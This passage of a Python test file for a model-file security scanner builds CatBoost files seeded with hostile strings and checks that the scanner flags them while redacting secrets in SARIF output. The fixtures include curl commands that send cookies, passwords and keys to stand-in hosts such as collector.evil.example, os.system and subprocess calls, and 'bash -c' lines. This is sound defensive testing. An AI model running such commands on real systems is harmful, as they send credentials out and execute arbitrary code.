    assert "C001_KEYCOMPAREIF_SECRET" not in failed_details
    assert "C001_KEYANDCOMPARE_SECRET" not in failed_details
    assert "C001_KEYCONTAINS_SECRET" not in failed_details
    assert "C001_KEYCHAIN_SECRET" not in failed_details
    assert "C001_KEYTUPMEM_SECRET" not in failed_details
    assert "C001_KEYDICTLOOKUP_SECRET" not in failed_details
    assert "C001_KEYDICTEXTRA_SECRET" not in failed_details
    assert "C001_KEYDUPLAST_SECRET" not in failed_details
    assert "C001_KEYDICTNONSTRKEY_SECRET" not in failed_details
    assert "C001_KEYDICTUNPACK_SECRET" not in failed_details
    assert "C001_KEYPREUNKNOWN_SECRET" not in failed_details
    assert "C001_KEYUNPACKUNKNOWN_SECRET" not in failed_details
    assert "<redacted>" in failed_details


def test_catboost_sarif_redacts_non_url_secret_evidence(tmp_path: Path) -> None:
    model_path = tmp_path / "sarif_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                (
                    r'os.system("curl https://collector.evil.example/upload"); '
                    r"api_key=\CATBOOST_API_KEY_SECRET_123456"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\u005c\u0022prefix;CATBOOST_AUTH_SECRET_123456\u005c\u0022"
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\\u005c\\u0022prefix CATBOOST_BEARER_SECRET_123456\\u005c\\u0022"
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\u005c\"prefix CATBOOST_MIXED_SECRET_123456\u005c\""
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\x22prefix;CATBOOST_HEX_SECRET_123456\x22"
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\042prefix CATBOOST_OCTAL_SECRET_123456\042"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\42prefix;CATBOOST_SHORTOCT_SECRET_123456\42"
                ),
                'os.system("id"); client_secret="""prefix CATBOOST_TRIPLE_SECRET_123456"""',
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\u0022\u0022\u0022prefix;CATBOOST_UNITRIPLE_SECRET_123456\u0022\u0022\u0022"
                ),
                'os.system("id"); client_secret=("prefix CATBOOST_PAREN_SECRET_123456")',
                'os.system("id"); client_secret="prefix " "CATBOOST_CONCAT_SECRET_123456"',
                'os.system("id"); client_secret="prefix " + "CATBOOST_PLUS_SECRET_123456"',
                'os.system("id"); client_secret="prefix %s" % "CATBOOST_PERCENT_SECRET_123456"',
                "os.system(\"id\"); client_secret=''.join(('prefix ', 'CATBOOST_JOIN_SECRET_123456'))",
                'os.system("id"); client_secret="" or "CATBOOST_OR_SECRET_123456"',
                'os.system("id"); client_secret=str("CATBOOST_CALLFIRST_SECRET_123456")',
                'os.system("id"); client_secret=str("token=decoy CATBOOST_INNERPREFIX_SECRET_123456")',
                r'os.system("id"); client_secret=str("quote: \" token=decoy CATBOOST_ESCINNER_SECRET_123456")',
                'config={"client_secret": "CATBOOST_JSONKEY_SECRET_123456"}; os.system("id")',
                r'config={"client\u005fsecret": "CATBOOST_KEYUNICODE_SECRET_123456"}; os.system("id")',
                r'config={"client\U0000005fsecret": "CATBOOST_KEYLONGU_SECRET_123456"}; os.system("id")',
                'config={"client" + "_secret": "CATBOOST_KEYPLUS_SECRET_123456"}; os.system("id")',
                'config={"client%s" % "_secret": "CATBOOST_KEYPERCENT_SECRET_123456"}; os.system("id")',
                (
                    'config={"client{suffix}".format(suffix="_secret"): '
                    '"CATBOOST_KEYKWFORMAT_SECRET_123456"}; os.system("id")'
                ),
                'config={f"client{\'_secret\'}": "CATBOOST_KEYFSTRING_SECRET_123456"}; os.system("id")',
                'config={str("client_secret"): "CATBOOST_KEYSTRCALL_SECRET_123456"}; os.system("id")',
                'config={"".join(("client", "_secret")): "CATBOOST_KEYJOIN_SECRET_123456"}; os.system("id")',
                'config={"clientXsecret".replace("X", "_"): "CATBOOST_KEYREPLACE_SECRET_123456"}; os.system("id")',
                'config={"terces_tneilc"[::-1]: "CATBOOST_KEYREVERSE_SECRET_123456"}; os.system("id")',
                'config={"TERCES_TNEILC"[::-1].lower(): "CATBOOST_KEYREVERSELOWER_SECRET_123456"}; os.system("id")',
                'config={("terces_tneilc" * 1)[::-1]: "CATBOOST_KEYREVERSEMULT_SECRET_123456"}; os.system("id")',
                'config={"TERCES_TNEILC"[::-1].swapcase(): "CATBOOST_KEYSWAPCASE_SECRET_123456"}; os.system("id")',
                'config={"client_secret".zfill(0): "CATBOOST_KEYZFILL_SECRET_123456"}; os.system("id")',
                'config={("client" + "_secret").zfill(0): "CATBOOST_KEYCOMPOSEDZFILL_SECRET_123456"}; os.system("id")',
                'config={"client_secret".expandtabs(): "CATBOOST_KEYEXPANDTABS_SECRET_123456"}; os.system("id")',
                'config={("client_secret" or "public"): "CATBOOST_KEYBOOLOR_SECRET_123456"}; os.system("id")',
                (
                    'config={("client_secret" or "public".islower()): '
                    '"CATBOOST_KEYBOOLSHORT_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if "yes" else "public"): '
                    '"CATBOOST_KEYTRUTHYIF_SECRET_123456"}; os.system("id")'
                ),
                'config={("client_secret" if 1 else "public"): "CATBOOST_KEYNUMIF_SECRET_123456"}; os.system("id")',
                (
                    'config={("client_secret" if ("yes",) else "public"): '
                    '"CATBOOST_KEYTUPLEIF_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if 1 == 1 else "public"): '
                    '"CATBOOST_KEYCOMPAREIF_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if (1 == 1 and 2 == 2) else "public"): '
                    '"CATBOOST_KEYANDCOMPARE_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if "x" in "x" else "public"): '
                    '"CATBOOST_KEYCONTAINS_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if "x" in "xy" == "xy" else "public"): '
                    '"CATBOOST_KEYCHAIN_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if "x" in ("x",) else "public"): '
                    '"CATBOOST_KEYTUPMEM_SECRET_123456"}; os.system("id")'
                ),
                'config={{"x": "client_secret"}["x"]: "CATBOOST_KEYDICTLOOKUP_SECRET_123456"}; os.system("id")',
                (
                    'config={{"x": "client_secret", "unused": True}["x"]: '
                    '"CATBOOST_KEYDICTEXTRA_SECRET_123456"}; os.system("id")'
                ),
                'config={{"x": True, "x": "client_secret"}["x"]: "CATBOOST_KEYDUPLAST_SECRET_123456"}; os.system("id")',
                (
                    'config={{"x": "client" + "_secret", 1: True}["x"]: '
                    '"CATBOOST_KEYDICTNONSTRKEY_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={{"x": "client" + "_secret", **{}}["x"]: '
                    '"CATBOOST_KEYDICTUNPACK_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={{("x".islower() and "x"): True, "x": "client_secret"}["x"]: '
                    '"CATBOOST_KEYPREUNKNOWN_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={{**{("x".islower() and "x"): True}, "x": "client_secret"}["x"]: '
                    '"CATBOOST_KEYUNPACKUNKNOWN_SECRET_123456"}; os.system("id")'
                ),
                'curl -H "Cookie: foo=bar; session=CATBOOST_COOKIE_HEADER_SECRET" https://collector.evil/upload',
                "curl --cookie session=CATBOOST_COOKIE_OPTION_SECRET https://collector.evil/upload",
                'curl --json \'{"password":"CATBOOST_JSON_BODY_SECRET"}\' https://collector.evil/upload',
                ("curl https://collector.evil/upload?data=%7B%22api_key%22%3A%22CATBOOST_QUERY_JSON_SECRET%22%7D"),
                "curl https://collector.evil/upload?aws.secret.access.key=CATBOOST_DOTTED_QUERY_SECRET",
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    sarif = format_sarif_output(result, [str(model_path)])
    sarif_doc = json.loads(sarif)

    assert determine_exit_code(result) == 1
    assert sarif_doc["runs"][0]["results"]
    assert "collector.evil.example" in sarif
    assert "os.system" in sarif
    assert "CATBOOST_API_KEY_SECRET" not in sarif
    assert "CATBOOST_AUTH_SECRET" not in sarif
    assert "CATBOOST_BEARER_SECRET" not in sarif
    assert "CATBOOST_MIXED_SECRET" not in sarif
    assert "CATBOOST_HEX_SECRET" not in sarif
    assert "CATBOOST_OCTAL_SECRET" not in sarif
    assert "CATBOOST_SHORTOCT_SECRET" not in sarif
    assert "CATBOOST_TRIPLE_SECRET" not in sarif
    assert "CATBOOST_UNITRIPLE_SECRET" not in sarif
    assert "CATBOOST_PAREN_SECRET" not in sarif
    assert "CATBOOST_CONCAT_SECRET" not in sarif
    assert "CATBOOST_PLUS_SECRET" not in sarif
    assert "CATBOOST_PERCENT_SECRET" not in sarif
    assert "CATBOOST_JOIN_SECRET" not in sarif
    assert "CATBOOST_OR_SECRET" not in sarif
    assert "CATBOOST_CALLFIRST_SECRET" not in sarif
    assert "CATBOOST_INNERPREFIX_SECRET" not in sarif
    assert "CATBOOST_ESCINNER_SECRET" not in sarif
    assert "CATBOOST_JSONKEY_SECRET" not in sarif
    assert "CATBOOST_KEYUNICODE_SECRET" not in sarif
    assert "CATBOOST_KEYLONGU_SECRET" not in sarif
    assert "CATBOOST_KEYPLUS_SECRET" not in sarif
    assert "CATBOOST_KEYPERCENT_SECRET" not in sarif
    assert "CATBOOST_KEYKWFORMAT_SECRET" not in sarif
    assert "CATBOOST_KEYFSTRING_SECRET" not in sarif
    assert "CATBOOST_KEYSTRCALL_SECRET" not in sarif
    assert "CATBOOST_KEYJOIN_SECRET" not in sarif
    assert "CATBOOST_KEYREPLACE_SECRET" not in sarif
    assert "CATBOOST_KEYREVERSE_SECRET" not in sarif
    assert "CATBOOST_KEYREVERSELOWER_SECRET" not in sarif
    assert "CATBOOST_KEYREVERSEMULT_SECRET" not in sarif
    assert "CATBOOST_KEYSWAPCASE_SECRET" not in sarif
    assert "CATBOOST_KEYZFILL_SECRET" not in sarif
    assert "CATBOOST_KEYCOMPOSEDZFILL_SECRET" not in sarif
    assert "CATBOOST_KEYEXPANDTABS_SECRET" not in sarif
    assert "CATBOOST_KEYBOOLOR_SECRET" not in sarif
    assert "CATBOOST_KEYBOOLSHORT_SECRET" not in sarif
    assert "CATBOOST_KEYTRUTHYIF_SECRET" not in sarif
    assert "CATBOOST_KEYNUMIF_SECRET" not in sarif
    assert "CATBOOST_KEYTUPLEIF_SECRET" not in sarif
    assert "CATBOOST_KEYCOMPAREIF_SECRET" not in sarif
    assert "CATBOOST_KEYANDCOMPARE_SECRET" not in sarif
    assert "CATBOOST_KEYCONTAINS_SECRET" not in sarif
    assert "CATBOOST_KEYCHAIN_SECRET" not in sarif
    assert "CATBOOST_KEYTUPMEM_SECRET" not in sarif
    assert "CATBOOST_KEYDICTLOOKUP_SECRET" not in sarif
    assert "CATBOOST_KEYDICTEXTRA_SECRET" not in sarif
    assert "CATBOOST_KEYDUPLAST_SECRET" not in sarif
    assert "CATBOOST_KEYDICTNONSTRKEY_SECRET" not in sarif
    assert "CATBOOST_KEYDICTUNPACK_SECRET" not in sarif
    assert "CATBOOST_KEYPREUNKNOWN_SECRET" not in sarif
    assert "CATBOOST_KEYUNPACKUNKNOWN_SECRET" not in sarif
    assert "CATBOOST_COOKIE_HEADER_SECRET" not in sarif
    assert "CATBOOST_COOKIE_OPTION_SECRET" not in sarif
    assert "CATBOOST_JSON_BODY_SECRET" not in sarif
    assert "CATBOOST_QUERY_JSON_SECRET" not in sarif
    assert "CATBOOST_DOTTED_QUERY_SECRET" not in sarif
    assert "<redacted>" in sarif


def test_catboost_sarif_redacts_mixed_sequence_and_set_key_expression_evidence(tmp_path: Path) -> None:
    model_path = tmp_path / "sarif_sequence_key_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                (
                    'config={("client_secret" if "x" in ["x"] != ("x",) else "public"): '
                    '"CATBOOST_MIXSEQ_RAW_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if "x" in {"x"} else "public"): '
                    '"CATBOOST_SETMEM_RAW_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if "x" in ["x"] == ("x",) else "public"): '
                    '"os.system(14) CATBOOST_MIXSEQ_VISIBLE_123456"}'
                ),
                'config={"client_secret" == "public": "os.system(15) CATBOOST_COMPARE_VISIBLE_123456"}',
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert "CATBOOST_MIXSEQ_RAW_SECRET" not in failed_details
    assert "CATBOOST_SETMEM_RAW_SECRET" not in failed_details
    assert "CATBOOST_MIXSEQ_RAW_SECRET" not in sarif
    assert "CATBOOST_SETMEM_RAW_SECRET" not in sarif
    assert "CATBOOST_MIXSEQ_VISIBLE" in failed_details
    assert "CATBOOST_MIXSEQ_VISIBLE" in sarif
    assert "CATBOOST_COMPARE_VISIBLE" in failed_details
    assert "CATBOOST_COMPARE_VISIBLE" in sarif
    assert "os.system(14)" in failed_details
    assert "os.system(14)" in sarif
    assert "os.system(15)" in failed_details
    assert "os.system(15)" in sarif


def test_catboost_sarif_redacts_ordered_container_key_expression_evidence(tmp_path: Path) -> None:
    model_path = tmp_path / "sarif_ordered_key_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                (
                    'config={("client_secret" if ["x"] <= ["x"] else "public"): '
                    '"CATBOOST_LISTORDER_RAW_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if ("x",) <= ("x",) else "public"): '
                    '"CATBOOST_TUPORDER_RAW_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if {"x"} <= {"x"} else "public"): '
                    '"CATBOOST_SETSUBSET_RAW_SECRET_123456"}; os.system("id")'
                ),
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert "CATBOOST_LISTORDER_RAW_SECRET" not in failed_details
    assert "CATBOOST_TUPORDER_RAW_SECRET" not in failed_details
    assert "CATBOOST_SETSUBSET_RAW_SECRET" not in failed_details
    assert "CATBOOST_LISTORDER_RAW_SECRET" not in sarif
    assert "CATBOOST_TUPORDER_RAW_SECRET" not in sarif
    assert "CATBOOST_SETSUBSET_RAW_SECRET" not in sarif
    assert "<redacted>" in failed_details
    assert "<redacted>" in sarif


def test_catboost_sarif_redacts_walrus_auth_and_nested_key_expression_evidence(tmp_path: Path) -> None:
    model_path = tmp_path / "sarif_nested_key_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                'os.system("id"); (client_secret := "CATBOOST_WALRUS_RAW_SECRET_123456")',
                'config={"Authorization": "Basic CATBOOST_JSONAUTH_RAW_SECRET_123456"}; os.system("id")',
                (
                    'config={("client_secret" if True is True else "public"): '
                    '"CATBOOST_IS_RAW_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if ("x",) in [("x",)] else "public"): '
                    '"CATBOOST_NESTMEM_RAW_SECRET_123456"}; os.system("id")'
                ),
                r'os.system("id"); client\u005fsecret="CATBOOST_ENCODEDKEY_RAW_SECRET_123456"',
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert "CATBOOST_WALRUS_RAW_SECRET" not in failed_details
    assert "CATBOOST_JSONAUTH_RAW_SECRET" not in failed_details
    assert "CATBOOST_IS_RAW_SECRET" not in failed_details
    assert "CATBOOST_NESTMEM_RAW_SECRET" not in failed_details
    assert "CATBOOST_ENCODEDKEY_RAW_SECRET" not in failed_details
    assert "CATBOOST_WALRUS_RAW_SECRET" not in sarif
    assert "CATBOOST_JSONAUTH_RAW_SECRET" not in sarif
    assert "CATBOOST_IS_RAW_SECRET" not in sarif
    assert "CATBOOST_NESTMEM_RAW_SECRET" not in sarif
    assert "CATBOOST_ENCODEDKEY_RAW_SECRET" not in sarif
    assert "<redacted>" in failed_details
    assert "<redacted>" in sarif


def test_catboost_sarif_redacts_augmented_assignment_and_none_identity_evidence(tmp_path: Path) -> None:
    model_path = tmp_path / "sarif_augmented_key_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                'os.system("id"); client_secret += "CATBOOST_AUG_RAW_SECRET_123456"',
                (
                    'config={("client_secret" if None is None else "public"): '
                    '"CATBOOST_NONEIS_RAW_SECRET_123456"}; os.system("id")'
                ),
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert "CATBOOST_AUG_RAW_SECRET" not in failed_details
    assert "CATBOOST_NONEIS_RAW_SECRET" not in failed_details
    assert "CATBOOST_AUG_RAW_SECRET" not in sarif
    assert "CATBOOST_NONEIS_RAW_SECRET" not in sarif
    assert "<redacted>" in failed_details
    assert "<redacted>" in sarif


def test_catboost_sarif_redacts_computed_auth_and_falsy_key_evidence_preserving_commands(tmp_path: Path) -> None:
    model_path = tmp_path / "sarif_falsy_key_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                'config={str("Authorization"): "Basic CATBOOST_STRAUTH_RAW_SECRET_123456"}; os.system("id")',
                (
                    'config={("client_secret" if not None else "public"): '
                    '"CATBOOST_NOTNONE_RAW_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if not {} else "public"): '
                    '"CATBOOST_EMPTYDICT_RAW_SECRET_123456"}; os.system("id")'
                ),
                'client_secret = os.system("id")',
                'client_secret=(os.system("id"))',
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert "CATBOOST_STRAUTH_RAW_SECRET" not in failed_details
    assert "CATBOOST_NOTNONE_RAW_SECRET" not in failed_details
    assert "CATBOOST_EMPTYDICT_RAW_SECRET" not in failed_details
    assert "CATBOOST_STRAUTH_RAW_SECRET" not in sarif
    assert "CATBOOST_NOTNONE_RAW_SECRET" not in sarif
    assert "CATBOOST_EMPTYDICT_RAW_SECRET" not in sarif
    assert "client_secret = os.system" in failed_details
    assert "client_secret=(os.system" in failed_details
    assert "client_secret = os.system" in sarif
    assert "client_secret=(os.system" in sarif


def test_catboost_sarif_redacts_subscript_auth_token_and_bare_key_evidence(tmp_path: Path) -> None:
    model_path = tmp_path / "sarif_subscript_auth_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                'os.system("id"); Authorization: Token CATBOOST_AUTHTOKEN_RAW_SECRET_123456',
                'config={str("token"): "CATBOOST_STRTOKEN_RAW_SECRET_123456"}; os.system("id")',
                'config={str("secret"): "CATBOOST_STRSECRET_RAW_SECRET_123456"}; os.system("id")',
                'cfg["client_secret"] = "CATBOOST_SUBSCRIPT_RAW_SECRET_123456"; os.system("id")',
                'headers["Authorization"] = "Basic CATBOOST_SUBAUTH_RAW_SECRET_123456"; os.system("id")',
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert "CATBOOST_AUTHTOKEN_RAW_SECRET" not in failed_details
    assert "CATBOOST_STRTOKEN_RAW_SECRET" not in failed_details
    assert "CATBOOST_STRSECRET_RAW_SECRET" not in failed_details
    assert "CATBOOST_SUBSCRIPT_RAW_SECRET" not in failed_details
    assert "CATBOOST_SUBAUTH_RAW_SECRET" not in failed_details
    assert "CATBOOST_AUTHTOKEN_RAW_SECRET" not in sarif
    assert "CATBOOST_STRTOKEN_RAW_SECRET" not in sarif
    assert "CATBOOST_STRSECRET_RAW_SECRET" not in sarif
    assert "CATBOOST_SUBSCRIPT_RAW_SECRET" not in sarif
    assert "CATBOOST_SUBAUTH_RAW_SECRET" not in sarif
    assert "<redacted>" in failed_details
    assert "<redacted>" in sarif


def test_catboost_sarif_redacts_float_and_bytes_falsy_key_evidence(tmp_path: Path) -> None:
    model_path = tmp_path / "sarif_falsy_literal_key_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                (
                    'config={("client_secret" if not 0.0 else "public"): '
                    '"CATBOOST_FLOAT_RAW_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if not b"" else "public"): '
                    '"CATBOOST_BYTES_RAW_SECRET_123456"}; os.system("id")'
                ),
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert "CATBOOST_FLOAT_RAW_SECRET" not in failed_details
    assert "CATBOOST_BYTES_RAW_SECRET" not in failed_details
    assert "CATBOOST_FLOAT_RAW_SECRET" not in sarif
    assert "CATBOOST_BYTES_RAW_SECRET" not in sarif
    assert "<redacted>" in failed_details
    assert "<redacted>" in sarif


def test_catboost_sarif_redacts_punctuated_auth_and_composed_subscript_preserving_nested_commands(
    tmp_path: Path,
) -> None:
    model_path = tmp_path / "sarif_composed_subscript_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                'os.system("id"); Authorization: Foo.Bar CATBOOST_DOTSCHEME_RAW_SECRET_123456',
                'cfg["client" + "_secret"] = "CATBOOST_SUBSCRIPTPLUS_RAW_SECRET_123456"; os.system("id")',
                'client_secret=(0, os.system("id"))',
                'client_secret=os.system("CATBOOST_CALLARG_RAW_SECRET_123456")',
                'client_secret=(os.system("id"), "CATBOOST_CMDFIRST_RAW_SECRET_123456")',
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert "CATBOOST_DOTSCHEME_RAW_SECRET" not in failed_details
    assert "CATBOOST_SUBSCRIPTPLUS_RAW_SECRET" not in failed_details
    assert "CATBOOST_CALLARG_RAW_SECRET" not in failed_details
    assert "CATBOOST_CMDFIRST_RAW_SECRET" not in failed_details
    assert "CATBOOST_DOTSCHEME_RAW_SECRET" not in sarif
    assert "CATBOOST_SUBSCRIPTPLUS_RAW_SECRET" not in sarif
    assert "CATBOOST_CALLARG_RAW_SECRET" not in sarif
    assert "CATBOOST_CMDFIRST_RAW_SECRET" not in sarif
    assert "os.system" in failed_details
    assert "os.system" in sarif


def test_catboost_sarif_redacts_nested_subscript_and_empty_constructor_key_evidence(tmp_path: Path) -> None:
    model_path = tmp_path / "sarif_nested_subscript_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                'cfg[("client_secret",)[0]] = "CATBOOST_SUBINDEX_RAW_SECRET_123456"; os.system("id")',
                ('cfg["client]secret".replace("]", "_")] = "CATBOOST_SUBBRACKET_RAW_SECRET_123456"; os.system("id")'),
                (
                    'config={("client_secret" if not set() else "public"): '
                    '"CATBOOST_EMPTYSET_RAW_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if not frozenset() else "public"): '
                    '"CATBOOST_EMPTYFROZEN_RAW_SECRET_123456"}; os.system("id")'
                ),
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert "CATBOOST_SUBINDEX_RAW_SECRET" not in failed_details
    assert "CATBOOST_SUBBRACKET_RAW_SECRET" not in failed_details
    assert "CATBOOST_EMPTYSET_RAW_SECRET" not in failed_details
    assert "CATBOOST_EMPTYFROZEN_RAW_SECRET" not in failed_details
    assert "CATBOOST_SUBINDEX_RAW_SECRET" not in sarif
    assert "CATBOOST_SUBBRACKET_RAW_SECRET" not in sarif
    assert "CATBOOST_EMPTYSET_RAW_SECRET" not in sarif
    assert "CATBOOST_EMPTYFROZEN_RAW_SECRET" not in sarif
    assert "<redacted>" in failed_details
    assert "<redacted>" in sarif


def test_catboost_sarif_redacts_empty_constructor_argument_key_evidence(tmp_path: Path) -> None:
    model_path = tmp_path / "sarif_empty_constructor_arg_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                (
                    'config={("client_secret" if not set(()) else "public"): '
                    '"CATBOOST_SETTUPLE_RAW_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if not list(()) else "public"): '
                    '"CATBOOST_LISTTUPLE_RAW_SECRET_123456"}; os.system("id")'
                ),
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert "CATBOOST_SETTUPLE_RAW_SECRET" not in failed_details
    assert "CATBOOST_LISTTUPLE_RAW_SECRET" not in failed_details
    assert "CATBOOST_SETTUPLE_RAW_SECRET" not in sarif
    assert "CATBOOST_LISTTUPLE_RAW_SECRET" not in sarif
    assert "<redacted>" in failed_details
    assert "<redacted>" in sarif


def test_catboost_sarif_redacts_digest_encode_decode_and_nonempty_constructor_key_evidence(tmp_path: Path) -> None:
    model_path = tmp_path / "sarif_digest_encode_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                ('os.system("id"); Authorization: Digest username=alice, response=CATBOOST_DIGEST_RAW_SECRET_123456'),
                ('cfg["client_secret".encode().decode()] = "CATBOOST_ENCODEDECODE_RAW_SECRET_123456"; os.system("id")'),
                'config={("client_secret" if set(("x",)) else "public"): "RAWVALUE8"}; os.system("id")',
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert "CATBOOST_DIGEST_RAW_SECRET" not in failed_details
    assert "CATBOOST_ENCODEDECODE_RAW_SECRET" not in failed_details
    assert "RAWVALUE8" not in failed_details
    assert "CATBOOST_DIGEST_RAW_SECRET" not in sarif
    assert "CATBOOST_ENCODEDECODE_RAW_SECRET" not in sarif
    assert "RAWVALUE8" not in sarif
    assert "<redacted>" in failed_details
    assert "<redacted>" in sarif


def test_catboost_sarif_preserves_process_context_while_redacting_command_expression_secrets(
    tmp_path: Path,
) -> None:
    model_path = tmp_path / "sarif_command_context_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "client_secret=\"subprocess.run('id') CATBOOST_SUBPROCESS_RAW_SECRET_123456\"",
                'client_secret=os.system("curl --password mypass7 https://collector.evil.example/upload")',
                "client_secret=os.system(\"curl --user 'alice:mypass8' https://collector.evil.example/upload\")",
                'client_secret=os.system("curl -ualice:mypass9 https://collector.evil.example/upload")',
                (
                    'client_secret=os.system("curl --password CATBOOST_CMDPASSWORD_RAW_SECRET_123456 '
                    'https://collector.evil.example/upload")'
                ),
                (
                    'client_secret=os.system("curl -u alice:CATBOOST_CMDUSERPASS_RAW_SECRET_123456 '
                    'https://collector.evil.example/upload")'
                ),
                'client_secret=(os.system("id"),CATBOOST_CMDTOKEN_RAW_SECRET_123456)',
                'client_secret=(os.system("id"), "hunter2-value")[1]',
                'client_secret=os.system("p@55w0rd!")',
                'client_secret=__import__("subprocess").run(["bash -c", "touch /tmp/pwned"])',
                'client_secret=os.system("bash -c touch /tmp/pwned")',
                'os.system("curl --password standalone7 https://collector.evil.example/upload")',
                "bash -c curl -u alice:standalone8 https://collector.evil.example/upload",
            ],
        ),
    )

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    sarif = format_sarif_output(result, [str(model_path)])

    assert determine_exit_code(result) == 1
    assert "CATBOOST_CMDTOKEN_RAW_SECRET" not in failed_details
    assert "hunter2-value" not in failed_details
    assert "p@55w0rd!" not in failed_details
    assert "CATBOOST_SUBPROCESS_RAW_SECRET" not in failed_details
    assert "CATBOOST_CMDPASSWORD_RAW_SECRET" not in failed_details
    assert "CATBOOST_CMDUSERPASS_RAW_SECRET" not in failed_details
    assert "mypass7" not in failed_details
    assert "mypass8" not in failed_details
    assert "mypass9" not in failed_details
    assert "standalone7" not in failed_details
    assert "standalone8" not in failed_details
    assert "CATBOOST_CMDTOKEN_RAW_SECRET" not in sarif
    assert "hunter2-value" not in sarif
    assert "p@55w0rd!" not in sarif
    assert "CATBOOST_SUBPROCESS_RAW_SECRET" not in sarif
    assert "CATBOOST_CMDPASSWORD_RAW_SECRET" not in sarif
    assert "CATBOOST_CMDUSERPASS_RAW_SECRET" not in sarif
    assert "mypass7" not in sarif
    assert "mypass8" not in sarif
    assert "mypass9" not in sarif
    assert "standalone7" not in sarif
    assert "standalone8" not in sarif
    assert "subprocess" in failed_details
    assert "bash -c" in failed_details
    assert "curl --password" in failed_details
    assert "curl --user" in failed_details
    assert "curl -ualice:" in failed_details
    assert "collector.evil.example" in failed_details
    assert "touch /tmp/pwned" in failed_details
    assert "subprocess" in sarif
    assert "bash -c" in sarif
